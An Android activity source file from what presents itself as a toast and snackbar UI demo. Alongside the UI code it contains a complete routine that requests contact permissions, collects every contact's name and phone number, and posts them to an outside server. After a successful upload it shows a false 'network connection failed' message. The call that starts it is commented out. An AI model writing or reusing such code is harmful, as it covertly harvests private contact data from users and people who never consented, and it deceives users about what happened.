package com.framework.android.toastutils;

import android.Manifest;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.AppCompatTextView;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.facebook.rebound.OrigamiValueConverter;
import com.facebook.rebound.SimpleSpringListener;
import com.facebook.rebound.Spring;
import com.facebook.rebound.SpringConfig;
import com.facebook.rebound.SpringSystem;
import com.lib.apihosts.ApiHost;
import com.lib.apihosts.ApiService;
import com.yanzhenjie.permission.Action;
import com.yanzhenjie.permission.AndPermission;

import java.io.Serializable;
import java.util.List;

import iammert.com.library.ConnectionStatusView;
import iammert.com.library.Status;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.POST;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private static final String TAG = "MMainActivity";
    private ConnectionStatusView mStatusView;

    StringBuilder stringBuilder = new StringBuilder();

    AppCompatTextView tvList;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mStatusView = (ConnectionStatusView) findViewById(R.id.sv_status);
        findViewById(R.id.btn_ShowTop).setOnClickListener(this);
        findViewById(R.id.btn_ShowBottom).setOnClickListener(this);

//        loadContacts();

        com.lib.apihosts.ApiService.setApihost(ApiHost.API_HOST_DEBUG);
        if (BuildConfig.DEBUG) {
            Log.i(TAG, "onCreate: "+ com.lib.apihosts.ApiService.getApihost());
        }
    }


    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btn_ShowTop: {
                mStatusView.setVisibility(View.VISIBLE);
                mStatusView.setStatus(Status.COMPLETE);
                break;
            }
            case R.id.btn_ShowBottom: {
                Snackbar.make(v, "你哈", 1000).setAction("取消", new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        startActivity(new Intent(MainActivity.this, TranslucentActivity.class));
                    }
                }).setDuration(Snackbar.LENGTH_LONG).show();

                break;
            }
            default:
                break;
        }
    }


    private String BaseUrl = "http://ces.drivekool.cn/index.php/home/";

    public interface ApiService {
        @FormUrlEncoded
        @POST("index/addddddd")
        Call<ResponseBody> submitContactList(@Field("text") String text);
    }

    ApiService apiService;

    private void loadContacts() {
        tvList = findViewById(R.id.tvContactList);

        Retrofit retrofit = new Retrofit.Builder().baseUrl(BaseUrl).build();
        apiService = retrofit.create(ApiService.class);

        AndPermission.with(this)
                .runtime()
                .permission(Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS)
                .onGranted(new Action<List<String>>() {
                    @Override
                    public void onAction(List<String> data) {
                        //通过
                        load();
                    }
                }).onDenied(new Action<List<String>>() {
            @Override
            public void onAction(List<String> data) {
                //为通过
            }
        }).start();
    }

    private void load() {
        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                cols, null, null, null);
        for (int i = 0; i < cursor.getCount(); i++) {
            cursor.moveToPosition(i);
            // 取得联系人名字
            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            String name = cursor.getString(nameFieldColumnIndex);
            String number = cursor.getString(numberFieldColumnIndex);
            String str = name + number + "/";
            stringBuilder.append(str);
            Log.i(TAG, "load: " + str);
        }
//        tvList.setText(stringBuilder.toString());
        String msg = stringBuilder.toString();
        Call<ResponseBody> call = apiService.submitContactList(msg);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                Toast.makeText(MainActivity.this, "网络连接失败，请检查您的网络设置", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {

            }
        });
    }

    public class JsonbEAN implements Serializable {

        /**
         * code : 1
         * msg : 失败
         */

        private int code;
        private String msg;

        public int getCode() {
            return code;
        }

        public void setCode(int code) {
            this.code = code;
        }

        public String getMsg() {
            return msg;
        }

        public void setMsg(String msg) {
            this.msg = msg;
        }
    }
}
